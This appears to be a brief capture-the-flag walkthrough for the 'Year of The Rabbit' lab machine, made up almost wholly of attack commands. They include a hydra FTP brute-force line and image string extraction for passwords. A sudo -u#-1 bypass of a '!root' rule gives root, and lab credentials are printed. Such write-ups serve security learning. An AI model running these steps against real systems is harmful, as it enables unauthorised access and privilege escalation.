# Year of The Rabbit
```
export ip = 10.10.201.214
```

## SCAN
```
1. 21, ftp
2. 22, ssh
3. 80, http
```

## Web
```
[export_ip/assets/style.css]
1. http://export_ip/sup3r_s3cr3t_fl4g.php

2. /intermediary.php?hidden_directory=/WExYY2Cv-qU  <-- burp proxy find

3. http://10.10.201.214/WExYY2Cv-qU/Hot_Babe.png

4. strings Hot_Babe.png
--> FTP USERNAME : ftpuser

5. FTP passwordlist
--> strings Hot_Babe.png >> PasswordISHere
--> hydra -l ftpuser -P ./PasswordISHere ftp://10.10.201.214 -V -f -t4
--> FTP PASSWORD : 5iez1wGXKfPKQ
```

## FTP 
```
1. GET Eli's_Creds.txt File

2. brainfuck decrypt
--> Result
User: eli
Password: DSpDiM1wAEwid
```

## Gainig Access
```
1. find / -name "*s3cr3t*" 2>/dev/null

2. cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!

--> Gwendoline : MniVCQVhQHUNI
```

## Privilige Escalate
```
1. sudo -l 
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

2. sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```